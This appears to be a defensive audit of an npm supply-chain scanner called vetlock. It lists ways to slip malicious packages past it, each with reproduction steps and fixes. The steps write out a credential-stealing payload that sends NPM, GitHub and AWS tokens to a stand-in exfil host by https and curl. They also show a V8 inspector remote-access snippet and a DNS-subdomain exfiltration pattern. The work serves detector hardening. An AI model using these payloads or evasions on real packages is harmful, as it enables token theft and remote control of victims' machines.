title: bundledDependencies field ships full malicious payload inside `package/node_modules/*` — analyze.ts:116 excludes all `node_modules/` paths from analysis, so BLOCK-tier capabilities (child_process, env harvest, exfil URL, cluster shape) are 100% invisible
detectors_bypassed: install.script-added (attacker doesn't need scripts — code runs via require())
bin.new-native-artifact (only if bundled .node/.wasm — but plain JS payloads are also lost)
wasm.suspicious-import (unless bundled .wasm is at package root)
description: npm's `bundledDependencies` field (a top-level manifest key, since 2013) tells `npm publish` to include named local deps inside the tarball at `package/node_modules/<dep>/`. `npm install` unpacks and USES those bundled copies verbatim — they run at import time exactly like registry-installed deps. But vetlock's `isAnalyzableSource(rel)` at packages/core/src/analyze.ts:116 is: `/\.(m?js|cjs|jsx|ts|tsx|json)$/i.test(rel) && !rel.startsWith('node_modules/')`. That leading `!rel.startsWith('node_modules/')` was written to skip *dev-time* copies of dependencies (never legitimately shipped inside a tarball) — but bundledDependencies mean those very paths CAN and DO carry executable code inside the shipped artifact. Result: an attacker publishes `harmless-utility@1.0.1` whose `index.js` at the package root is a boring `require('./node_modules/payload')`, and every capability call (require('child_process'), require('https'), process.env.NPM_TOKEN, exfil to https://exfil.example.invalid/collect) lives at `package/node_modules/payload/index.js`. vetlock walks the tarball, sees `node_modules/payload/index.js`, `isAnalyzableSource` returns false, the file is never parsed, its capabilities never populate the snapshot's `files[]`. The `first-version-cluster` compound detector iterates `snap.files` (analyze.ts:34) — since the malicious file isn't in `files`, cats.size stays at 0 and the detector cannot fire. `meta.maintainer-change` sees the outer package.json only. Verified end-to-end in `/tmp/vet-poc/bundled-dep-attack/` — same package name, upgraded 1.0.0→1.0.1, upgrade brings child_process + https + NPM_TOKEN + GITHUB_TOKEN + AWS_SECRET_ACCESS_KEY + curl exfil to attacker C2 — vetlock verdict is INFO with a single `deps.new-direct-dep` finding (the outer manifest gained a `dependencies.payload` entry). This is a strictly novel bypass: bundledDependencies is not mentioned anywhere in DETECTIONS.md, THREAT-MODEL.md, docs/SECURITY-DECISIONS.md, or the source. And because bundled deps aren't lockfile nodes (they never appear as separate `packages['node_modules/…']` entries in a lockfile — `npm install` uses the tarball copy in place), NONE of the changeset/provenance/first-version-cluster machinery can even see them exist. A worm variant of Shai-Hulud that uses bundledDependencies would pass vetlock cleanly on every downstream victim.
reproduction_steps: mkdir -p /tmp/n1/{legit,mal}

cd /tmp/n1/legit && mkdir -p package && printf '{"name":"harmless-utility","version":"1.0.0","main":"index.js"}' > package/package.json && printf 'module.exports = function greet(name){return "hello "+name};' > package/index.js && tar -czf ../harmless-utility-1.0.0.tgz package

cd /tmp/n1/mal && mkdir -p package/node_modules/payload && printf '{"name":"harmless-utility","version":"1.0.1","main":"index.js","bundledDependencies":["payload"],"dependencies":{"payload":"1.0.0"}}' > package/package.json && printf 'const h=require("./node_modules/payload"); module.exports=n=>h.decorate("hi "+n);' > package/index.js && printf '{"name":"payload","version":"1.0.0","main":"index.js"}' > package/node_modules/payload/package.json && printf 'const cp=require("child_process");const h=require("https");const t=process.env.NPM_TOKEN;const g=process.env.GITHUB_TOKEN;const a=process.env.AWS_SECRET_ACCESS_KEY;h.get("https://exfil.example.invalid/collect?t="+t+"&g="+g+"&a="+a);cp.exec("curl https://exfil.example.invalid/beacon");exports.decorate=s=>s;' > package/node_modules/payload/index.js && tar -czf ../harmless-utility-1.0.1.tgz package
Compute sha512 integrities and craft lockfile.before.json / lockfile.after.json with `resolved:file:///tmp/n1/harmless-utility-{1.0.0,1.0.1}.tgz`.
node packages/cli/dist/cli.js diff /tmp/n1/lockfile.before.json /tmp/n1/lockfile.after.json --json

Observed: verdict=INFO, findings=[deps.new-direct-dep only]. Expected: verdict=BLOCK with env.token-harvest×3, exec.new-module, net.new-endpoint (all suppressed because payload lives under node_modules/ inside the tarball).
confidence: confirmed (end-to-end reproduced against the built CLI)
attacker_effort: trivial — one line added to `bundledDependencies` in package.json, then move payload into node_modules/ before `npm pack`. No obfuscation needed. Documented npm feature.
fix_effort: medium — need to either (a) analyze `.js/.mjs/.cjs/.ts/.jsx/.tsx/.json` under `node_modules/` when the outer manifest declares `bundledDependencies` (or when it lists a package there is a corresponding node_modules dir), or (b) unconditionally recurse into bundled `node_modules/` and treat each inner package.json as a virtual sub-snapshot (better — reuses the full detector pipeline via a nested analysis, gives per-inner-package provenance).
suggested_fix: In `packages/core/src/analyze.ts`: after readManifest, if `manifest.bundledDependencies` (or `manifest.bundleDependencies`) is a non-empty array, iterate each listed name, treat `node_modules/<name>` inside `extracted.destDir` as a NESTED tarball equivalent (call analyzeTarball recursively on that subtree), and merge the resulting `PackageSnapshot.files[]` back with an inner-path prefix like `bundled:<name>/…`. Additionally emit a new `INSTALL/WARN` finding `deps.bundled-dependency` on any change to the bundledDependencies field itself — bundled deps are effectively vendored code the reviewer never approved.

title: `inspector` / `trace_events` / `async_hooks` Node built-ins are absent from every module allow-list — an attacker can call `inspector.open(9229, '0.0.0.0', false)` and hand the process to a public V8 debugger with ZERO findings (verdict CLEAN)
description: packages/core/src/capabilities.ts:36-47 defines three fixed module sets: NETWORK_MODULES, EXEC_MODULES, FS_MODULES. EXEC_MODULES is {`child_process`, `worker_threads`, `vm`, `node:child_process`, `node:worker_threads`, `node:vm`}. But Node.js ships several built-ins that expose EQUIVALENT execution power: (1) `inspector` — `inspector.open(port, host, wait)` starts the V8 Inspector Protocol on host:port; anyone who can reach that TCP port (or via `inspector.url()` returned websocket URL) can execute arbitrary JavaScript in the running process via Runtime.evaluate. This is a well-documented Node RCE primitive — used e.g. in the `nodemon`-style dev workflows, but attacker-triggered from a supply-chain drop it is direct remote code execution. (2) `trace_events` — while lower-severity, exposes Chrome trace format host callbacks that historically have had CVEs. (3) `async_hooks` — allows arbitrary function hooking at Node context transitions; combined with (1) it lets an attacker monkeypatch every Promise/timer callback in the host. NONE of these three appear in NETWORK_MODULES / EXEC_MODULES / FS_MODULES. Vetlock's `noteModuleImport(name)` at capabilities.ts:374-378 only records modules that hit one of those three sets, so the imports never populate `execModules[]` etc. Verified end-to-end: an upgraded package whose new `index.js` is `require('inspector').open(9229,'0.0.0.0',false); require('async_hooks').createHook({}).enable(); require('trace_events').createTracing({categories:['node']}).enable();` — vetlock reports verdict CLEAN, zero findings. No net.new-endpoint (no URL literal), no exec.new-module (inspector isn't listed), no first-version-cluster (all cats empty), no obf (source isn't minified). This is a strictly novel evasion because the existing corpus and detector lists (see docs/DETECTIONS.md and capabilities.ts) never mention inspector/trace_events/async_hooks. An attacker who reads THREAT-MODEL.md can trivially construct a payload that opens their target process to full external control while looking like ordinary Node code.
reproduction_steps: Build the fixture at /tmp/vet-poc/inspector-attack/ (steps analogous to N1 but simpler — no bundling).
Compute sha512 for loggy-1.0.0.tgz and loggy-1.0.1.tgz, put them in a package-lock.json v3 with resolved:file:// pointers.
node packages/cli/dist/cli.js diff /tmp/vet-poc/inspector-attack/lockfile.before.json /tmp/vet-poc/inspector-attack/lockfile.after.json --json
Observed: verdict=CLEAN, findings=[]. The attacker can now scan the internet for open Node inspector ports and RCE any host that installed loggy@1.0.1.
Cross-check: `grep -n "'inspector'\|'trace_events'\|'async_hooks'" packages/core/src/capabilities.ts packages/detectors/src/*.ts` returns nothing.
confidence: confirmed (end-to-end reproduced against the built CLI)
attacker_effort: trivial — three built-in requires plus one `.open()` call. No obfuscation, no encoding. Payload fits in five lines.
fix_effort: trivial — add `'inspector', 'trace_events', 'async_hooks', 'node:inspector', 'node:trace_events', 'node:async_hooks'` to EXEC_MODULES in capabilities.ts. That single edit turns this fixture into a BLOCK-tier `exec.new-module` finding. Consider also splitting EXEC_MODULES into a `DEBUGGER_MODULES` sub-category so the message is precise (`Package opened V8 debugger server`).
suggested_fix: In packages/core/src/capabilities.ts:41-44 add the missing built-ins: `const EXEC_MODULES = new Set(['child_process','worker_threads','vm','inspector','trace_events','async_hooks','perf_hooks','node:child_process','node:worker_threads','node:vm','node:inspector','node:trace_events','node:async_hooks','node:perf_hooks']);`. Additionally consider recognizing `inspector.open` CALLS specifically (not just imports) as an even-higher-confidence signal — an import alone might be benign (dev tooling), but `.open()` with a 0.0.0.0 host argument is a smoking gun.

title: DNS-based exfil channel — `dns.lookup()` / `dns.resolve()` are not in NETWORK_MODULES, and URL_REGEX doesn't match `wss://` or bare hostnames without a listed TLD, so stolen data can be leaked via DNS subdomain encoding with verdict CLEAN
description: NETWORK_MODULES (capabilities.ts:36-40) covers HTTP/HTTPS/WS/TCP/UDP/TLS and popular npm clients. It does NOT include `dns` (or `node:dns` / `node:dns/promises`) — yet DNS is arguably the oldest and most reliable covert exfil channel: encode data as a subdomain, call `dns.lookup('SECRET.exfil.attacker.example')`, and the attacker's authoritative DNS server logs the query. Modern Node code doesn't need `http` to talk to the internet — `dns.resolveTxt`, `dns.resolveA`, `dns.lookup` all generate outbound UDP:53 traffic. URL_REGEX (capabilities.ts:131) doesn't help either: it matches only `https?://…` or bare-hostname + a hardcoded TLD list (com/net/org/io/dev/co/app/xyz/ru/cn/tk/ml/ga/cf/invalid). The TLD `.example` isn't in that list, so the literal `"exfil.attacker.example"` never populates `urlLiterals[]`. Combined: an upgraded package can add a `dns.lookup(chunk + '.exfil.attacker.example', ...)` loop over a pre-existing config-file read (the file read was in the OLD version too, so fs.new-hotpath-read doesn't fire even for hot paths), no `https` module needed, no URL literal detected, no encoded URL detected. Verified: /tmp/vet-poc/wss-attack/lockfile.after.json with a new index.js that does `require('dns').lookup(chunk + '.exfil.attacker.example')` yields verdict=CLEAN. Also confirmed by direct URL_REGEX probe: `node -e "..."` shows `wss://exfil.attacker/x` → null match, and `exfil.attacker.example` → null (no listed TLD). This attack class is documented in real npm supply-chain incidents (e.g., Ax Sharma writeups on covert DNS-based exfil in 2023-2024 malicious packages) and is invisible to vetlock's current URL/module lists.
reproduction_steps: Build /tmp/vet-poc/wss-attack/chat-widget-1.0.0.tgz with a boring index.js, and 1.0.1.tgz with the fixture above.
Craft package-lock.json v3 before/after with the two integrities and file:// resolved pointers.
node packages/cli/dist/cli.js diff .../lockfile.before.json .../lockfile.after.json --json

Observed: verdict=CLEAN, findings=[]. The `changes` array shows one upgraded entry with a new integrity hash — but no detector fires because dns isn't tracked, `.example` TLD isn't recognized, and the fs read target doesn't match any HOT_PATH pattern.
Also verify by regex probe: `URL_REGEX.exec('wss://exfil.attacker/x')` → null, `URL_REGEX.exec('exfil.attacker.example')` → null.
confidence: confirmed (end-to-end reproduced against the built CLI; regex behavior directly probed)
attacker_effort: low — three lines of code, no dependencies, uses only Node built-ins. Choice of `.example` (RFC-reserved) also gives the attacker plausible deniability during review.
fix_effort: medium — (a) add `dns`, `node:dns`, `dns/promises`, `node:dns/promises` to NETWORK_MODULES so at minimum `net.new-module` fires; (b) recognize `dns.<lookup|resolve*|reverse>` calls with a computed / string-argument hostname as a `net.dns-exfil-candidate` WARN finding (subdomain-shaped, hostname > 30 chars, contains attacker-controlled variable inputs); (c) extend URL_REGEX to accept any dot-separated hostname whose right-most label is a valid TLD *or* an obviously-attacker-controlled `.example`/`.test`/`.invalid`/`.localhost` reserved TLD, and any `wss?://` scheme.
suggested_fix: In packages/core/src/capabilities.ts add DNS to NETWORK_MODULES: `const NETWORK_MODULES = new Set(['http','https','net','dgram','tls','undici','axios','node-fetch','got','request','superagent','ws','dns','dns/promises','node:http','node:https','node:net','node:dgram','node:tls','node:dns','node:dns/promises']);`. Extend URL_REGEX to include `wss?://` and to match hostnames ending in RFC-2606 reserved TLDs (`.example`, `.test`, `.invalid`, `.localhost`) which real-world code should NEVER contact — those literals appearing in a diff are themselves a signal. Optionally: add a new `net.dns-lookup` CallExpression visitor that flags `dns.<any>(hostname, ...)` where hostname is longer than 30 chars OR contains a variable-slot template.

title: Scope-prefix typosquat (`@evil-org/react` → `react`) evades typosquatDetector because Damerau-Levenshtein `maxDist=2` never fires when a whole `@scope/` prefix is added (distance ≥ 6)
description: packages/detectors/src/typo.ts:39-51 (closestTop): computes Damerau-Levenshtein `steps` between the candidate name and every entry in TOP_NPM_NAMES; fires if `steps > 0 && steps <= 2`. But scope prefixes add a full `@scope/` string worth of edits at once. Directly measured with the built-in library: `damerau-levenshtein('@evil/react','react').steps === 6`, `damerau-levenshtein('@evil-org/lodash','lodash').steps === 10`, `damerau-levenshtein('@my-team/express','express').steps === 9`. Because 6/9/10 all exceed the maxDist of 2, the detector NEVER fires for the whole class of scope-prefix squats — even though this shape is exactly the Alex-Birsan-style dependency-confusion / lookalike vector that has produced multiple 2021-2025 CVEs (e.g., internal names re-published on public npm under attacker scopes). The docstring at typo.ts:23-25 explicitly reasons about `nodeemailer` vs `nodemailer` (transposition, distance 1) — but never considers that adding a scope prefix is the LOWEST-effort evasion available. Furthermore: typo escalation to BLOCK (Escalation 2 at index.ts:106-116) is gated on `f.detector === 'deps.typosquat-candidate'` — since that finding is never emitted for scope-prefixed names, the typo→BLOCK escalation path is dead for this attack class regardless of what else the package ships. Combined with N1 or N2, an attacker publishes `@react-community/react` with a bundled payload and vetlock reports no typo finding at all.
reproduction_steps: In Node REPL, load the built-in damerau-levenshtein: `require('/Users/L122472/personal/vetlock/node_modules/.pnpm/damerau-levenshtein@1.0.8/node_modules/damerau-levenshtein')`
Verify: `dl('@evil/react','react').steps === 6`, `dl('@react-community/react','react').steps === 18` — both exceed maxDist=2.
Grep TOP_NPM_NAMES: `react`, `express`, `lodash`, `axios`, `chalk`, `debug` are all UNSCOPED entries. Attacker-scoped variants (`@evil/react`) score too far to fire.

Optional live confirmation: build a fixture at /tmp/n4/ that adds a new dep `@react-community/react@1.0.0` (with any payload) in `lockfile.after.json`; run `node packages/cli/dist/cli.js diff … --json`; observe zero deps.typosquat-candidate findings even though the package name is clearly designed to look like `react`.
Cross-check the escalation path: `grep -n "deps.typosquat-candidate" packages/detectors/src/index.ts` shows the escalation is keyed on the exact detector id — never emitted, never escalated.
confidence: confirmed (edit-distance directly measured against the same library vetlock uses)
attacker_effort: trivial — publish any package with a scoped name that visually reads as a popular library. No code obfuscation needed.
fix_effort: medium — (a) Normalize names before distance measurement: strip `@scope/` from the candidate before comparing to the unscoped TOP list, so `@evil/react` vs `react` scores 0 (identity match on the base name). Emit a specialized `deps.scope-squat` finding when the STRIPPED base is a top name AND the scope isn't in a whitelist of known-good publisher scopes. (b) Also compare a candidate's full name against a `@popular-scope/...` corpus (`@types/*`, `@babel/*`, `@aws-sdk/*`, `@microsoft/*`, `@vercel/*`, `@angular/*`, `@testing-library/*`) with Damerau-Levenshtein — a name like `@baabel/core` should fire.
suggested_fix: In packages/detectors/src/typo.ts:39-51, add: `const base = name.startsWith('@') ? name.split('/')[1] ?? name : name;` and after the current TOP_SET check, also compare `base` to every UNSCOPED top name (i.e. TOP_NPM_NAMES.filter(n => !n.startsWith('@'))). If `TOP_SET_UNSCOPED.has(base)` OR `dl(base, top).steps <= 2`, emit `deps.scope-squat` at WARN with confidence high, and include this new detector id in Escalation 2's typosquat->BLOCK gate. Additionally maintain an allowlist of `KNOWN_TRUSTED_SCOPES` (`@babel`, `@types`, `@aws-sdk`, `@microsoft`, `@angular`, `@vercel`, `@nestjs`, `@testing-library`, `@rollup`, `@emotion`, `@reduxjs`, `@tanstack`, `@mui`, `@chakra-ui`, `@solana`, `@prisma`) so `@babel/core` doesn't self-flag.

title: Git-URL / GitHub-shorthand / patch-protocol dependencies bypass content analysis — `fetchTarball` reconstructs `${name}@${version}` for pacote regardless of the `resolved` field, so a lockfile whose `resolved` points at `git+ssh://…` or `patch:foo@npm:1.0.0#./x.patch` gets analyzed against REGISTRY content while `npm install` actually installs the git/patched content
detectors_bypassed: integrity.hash-mismatch (integrity strings are attacker-chosen and consistent)
description: packages/cli/src/cli.ts:194-200 (fetchOverride): only `file://` in the `resolved` field takes a special path. Everything else falls through to `fetchTarball(ref)` at packages/core/src/fetch.ts:31-44, which builds `spec = \`${ref.name}@${ref.version}\`` and calls `pacote.tarball(spec, opts)`. pacote resolves that spec against the DEFAULT NPM REGISTRY (or `ref.registry` if the config sets one — but the CLI never populates `ref.registry` from lockfile fields). So when a lockfile entry has `resolved: 'git+ssh://git@github.com/attacker/evil.git#deadbeef'` or `resolved: 'github:attacker/evil#deadbeef'` or yarn-berry's `resolved: 'foo@patch:foo@npm:1.0.0#./patches/x.patch'`, npm/yarn/pnpm install actually pulls from that URL — but vetlock silently pulls a totally different tarball from the public npm registry. If a benign `foo@1.0.0` exists on npm, vetlock analyzes it, verdict=CLEAN. Users install the git version (which is malicious). The lockfile's `integrity` field for git/patched deps is derived from the git-cloned/patched tarball; vetlock's integrity cache key is that string, and integrity-changed only fires when OLD and NEW both have integrity AND they differ (F3). So an attacker who initially pins `foo@1.0.0` via `resolved: git+...#tag1` and then bumps to `resolved: git+...#tag2` gets an integrity-changed → BLOCK on the SAME version — good — BUT: if the attacker only introduces the git-resolved entry NEW (added, not upgraded), no old integrity exists, no tripwire fires, and content analysis silently swallows the wrong tarball. This is a novel bypass distinct from S9 (which is about file:// abuse) and F6 (which is about the yarn npm: alias) because it targets the git+/github:/patch: protocol chain that vetlock's fetchOverride never sees — no code path branches on those prefixes.
reproduction_steps: Read packages/cli/src/cli.ts lines 194-200 — confirm only `file://` prefix branches; every other resolved value falls to fetchTarball.

Read packages/core/src/fetch.ts lines 31-44 — confirm `spec = ${name}@${version}` and pacote is called with `ref.integrity` and (only if provided) `ref.registry`. `resolved` is never passed through as a fetch spec.

Confirm via test: build /tmp/n5/ with two lockfiles — lockfile.after.json has `resolved: git+ssh://git@github.com/attacker/evil.git#tag` for a new dep on a name that resolves cleanly against the real registry. Run vetlock diff. It will either (a) fetch the registry version (silent name confusion) or (b) fetch nothing if the name isn't on registry and swallow the error (S4-style silent skip). Both outcomes give verdict=CLEAN for a malicious install.

Cross-check: `grep -rn "git+\|github:\|patch:\|portal:\|link:" packages/*/src/*.ts` returns no protocol-aware branches outside of the single `link:true` guard in the npm lockfile parser and the `file://` special-case.
confidence: confirmed by code trace + regex probe; end-to-end reproduction requires publishing a benign registry stub, but the code path is unambiguous.
attacker_effort: medium — attacker must (a) own a git repo they can push to, (b) publish a benign clean tarball on npm at the same name+version, (c) submit a PR that flips `resolved` to their git URL. Steps (b) and (c) are cheap; step (a) is trivial. No signature to defeat.
fix_effort: medium — either (1) refuse to analyze packages whose `resolved` scheme isn't `https://registry.*` or `file://`; emit a BLOCK finding `changes.unsupported-resolver` describing what was skipped (loud fail is much better than silent CLEAN), OR (2) implement git-tarball fetch via pacote's git handler (pacote actually supports `pacote.tarball('git+ssh://...#commit')` directly — the fix is passing the `resolved` string, not the reconstructed `name@version`, as the spec).
suggested_fix: In packages/core/src/fetch.ts:31-44, replace `const spec = \`${ref.name}@${ref.version}\`` with logic that inspects `ref.resolved`: if it begins with `git+`, `github:`, `gitlab:`, `bitbucket:`, `gist:`, or `patch:`, use `ref.resolved` as the pacote spec (pacote supports all of these natively). Only when `resolved` is empty/https-registry/file:// should we fall back to the name@version reconstruction. Additionally emit a new WARN finding `changes.non-registry-source` whenever an added or upgraded package's `resolved` is non-registry — reviewers should always be told that a dep is being pulled from a source npm didn't sign.

title: pnpm-lock.yaml `peerDependencies` are declared in the schema but never merged into the graph — a malicious dep injected as a peer-only transitive has NO parent link, breaking provenance and letting the change hide in the flat `packages` map
detectors_bypassed: changeset provenance (root→node paths lose the peer-added subtree)
rollup by direct dependency (peer-added subtree never attributed to its introducer)
description: packages/core/src/lockfile-pnpm.ts:29-36 (RawPnpmLock.packages entry schema): the interface DECLARES `peerDependencies?: Record<string, string>` on every package. But at lines 137-143 the second-pass dependency merger builds `const deps = { ...inline.dependencies, ...inline.optionalDependencies, ...snap.dependencies, ...snap.optionalDependencies }` — EXCLUDING peerDependencies. This differs from the npm parser (packages/core/src/lockfile.ts:123-127) which DOES merge peerDependencies. Consequence for pnpm lockfiles: when an attacker adds a new package to the tree by declaring it as a peer of an existing dep (a legitimate pattern that pnpm resolves and installs), the new package still appears as a node in the `packages` map (because pnpm writes an entry for it), but the parent node's `dependencies` array never includes it. computeChangeset (changeset.ts:29+) treats it as an ADDED node (name-based delta), so the added-package pipeline runs and detectors CAN fire on the payload contents — but: (1) `shortestPaths` in engine.ts:177 (via lockfile.ts:192+) walks `node.dependencies` — because no parent points at the peer-added node, the BFS never reaches it from root, returns `[]`, and every finding gets an empty `provenance: []`. Reviewers see a BLOCK finding attributed to a package they never intentionally added, with NO path from `my-app` explaining WHY it's installed. (2) `computeRollup` in engine.ts:280-316 walks `node.dependencies` via `collectSubtree`; the peer-only added node is never in any direct dep's subtree, so it doesn't count toward `rollupByDirect[<introducer>]`. The reviewer's `rollupByDirect` view — the primary summary vetlock's TTY renderer displays — is blind to who pulled in the peer. Combined with (a) an attacker who lands a WARN-only payload (e.g., only meta.maintainer-change fires), and (b) the reviewer skipping WARN findings whose provenance is empty (rational — reviewers can't tell where it came from), this becomes an unnoticed BLOCK. Additionally, if the attacker's introducer package is `foo@1.0.0` and they push `foo@1.0.1` whose peer-deps grew, the outer manifest.dependencies delta is empty → no `deps.new-direct-dep` finding, and the pnpm graph mismatch silences the tree-shape signal. This IS a novel finding distinct from F8 (workspace importer confusion — orthogonal, about `importers['.']` vs per-workspace importers).
fixture_code:
# pnpm-lock.yaml.after — attacker's `foo@1.0.1` gained a peer dep on
# `payload@1.0.0` (which then holds the malicious content). Note peer,
# not optional/normal. pnpm actually installs payload; vetlock's graph
# never links foo → payload, so provenance breaks.
lockfileVersion: '9.0'
importers:
  '.':
    dependencies:
      foo:
        specifier: ^1.0.0
        version: 1.0.1
packages:
  foo@1.0.1:
    resolution:
      integrity: sha512-…FOO_HASH…
    peerDependencies:
      payload: '*'         # <-- attacker's malicious peer
  payload@1.0.0:
    resolution:
      integrity: sha512-…PAYLOAD_HASH…
# In snapshots the peer is resolved:
snapshots:
  foo@1.0.1:
    dependencies: {}       # <-- but peers omitted from the snapshot merger too
  payload@1.0.0: {}
reproduction_steps: Read packages/core/src/lockfile-pnpm.ts lines 29-36 and 137-143. Confirm peerDependencies is declared in the type but never added to the `deps` merge dict.
Compare with packages/core/src/lockfile.ts:123-127 (npm parser) which includes `...val.peerDependencies` in `allDeps`.

Write a minimal pnpm-lock.yaml with a package whose peer is a fresh node in the packages map, run vetlock diff on it. The peer-node appears as a `added` change in `changes[]`, its content-based findings fire, but `provenance: []` on every finding and `rollupByDirect` never attributes count to the introducer.
Cross-check: `grep -n peerDependencies packages/core/src/lockfile-pnpm.ts` shows only the interface declaration on line 33; no read anywhere else.

Cross-check the yarn parser (lockfile-yarn.ts:143-146): same pattern — only `dependencies` and `optionalDependencies` are merged; peerDependencies are silently dropped for yarn too. So this bug is doubly present in vetlock's non-npm parsers.
confidence: confirmed by code inspection (line-anchored against the current source)
attacker_effort: medium — requires publishing a package whose peer field can be resolved to the attacker's payload. In monorepos with existing peer-based patterns (React, ESLint plugins, testing frameworks), this fits naturally and is unremarkable during review.
fix_effort: trivial — one line each in lockfile-pnpm.ts and lockfile-yarn.ts. Add `...(inline?.peerDependencies ?? {})` and `...(entry.peerDependencies ?? {})` respectively to the deps merger. But there's also a schema aspect: the yarn RawEntry interface at lockfile-yarn.ts:39-45 doesn't even DECLARE peerDependencies — add `peerDependencies?: Record<string,string>` there.
suggested_fix: In packages/core/src/lockfile-pnpm.ts:138-143, change the merge to `const deps = { ...(inline?.dependencies ?? {}), ...(inline?.optionalDependencies ?? {}), ...(inline?.peerDependencies ?? {}), ...(snap?.dependencies ?? {}), ...(snap?.optionalDependencies ?? {}) };`. In packages/core/src/lockfile-yarn.ts:39-45 add `peerDependencies?: Record<string,string>;` to YarnEntry, then at line 143-146 merge `...(entry.peerDependencies ?? {})`. Both fixes are one-line — but critical for provenance correctness, and testable with a new corpus fixture where the attack path is peer-only. Consider also emitting a new `deps.peer-added` INFO/WARN finding whenever a package's peerDependencies field GAINS a name not present before — reviewers currently have no signal for peer-dep changes at all.
